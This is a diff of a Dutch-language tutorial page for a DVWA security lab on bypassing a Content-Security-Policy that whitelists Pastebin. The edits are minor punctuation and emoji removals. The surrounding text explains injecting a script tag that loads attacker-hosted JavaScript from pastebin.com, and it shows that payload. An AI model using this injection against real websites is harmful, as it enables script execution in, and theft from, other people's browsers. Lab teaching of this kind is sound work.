@@ -23,7 +23,7 @@ Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com;
 
 <summary>Antwoord</summary>
 
-De CSP vertelt de browser: "Voer alleen JavaScript uit als het afkomstig is van ons eigen domein (`self`), Pastebin, of Hastebin." Inline scripts worden geblokkeerd. Maar als je jouw kwaadaardige JavaScript op Pastebin plaatst en daarna op DVWA de tag `<script src="https://pastebin.com/raw/JOUW_ID"></script>` injecteert, controleert de browser de domeinnaam: Pastebin staat op de lijst — het script wordt uitgevoerd!
+De CSP vertelt de browser: "Voer alleen JavaScript uit als het afkomstig is van ons eigen domein (`self`), Pastebin, of Hastebin." Inline scripts worden geblokkeerd. Maar als je jouw kwaadaardige JavaScript op Pastebin plaatst en daarna op DVWA de tag `<script src="https://pastebin.com/raw/JOUW_ID"></script>` injecteert, controleert de browser de domeinnaam: Pastebin staat op de lijst — het script wordt uitgevoerd.
 
 </details>
 
@@ -33,7 +33,7 @@ Start het lab en bekijk het invoerveld.
 
 <DvwaLab module="csp_bypass" level="low" />
 
-> ⚠️ **Labbeperking:** Het hosten van een extern script op Pastebin is vereist voor de volledige aanval. Het lab simuleert de CSP-logica, maar de daadwerkelijke externe script-injectie werkt het best met een [lokale DVWA-installatie](/docs/dvwa_installatie).
+> **Labbeperking:** Het hosten van een extern script op Pastebin is vereist voor de volledige aanval. Het lab simuleert de CSP-logica, maar de daadwerkelijke externe script-injectie werkt het best met een [lokale DVWA-installatie](/docs/dvwa_installatie).
 
 Vul een gewone naam in en klik op Submit. Observeer hoe de pagina reageert.
 
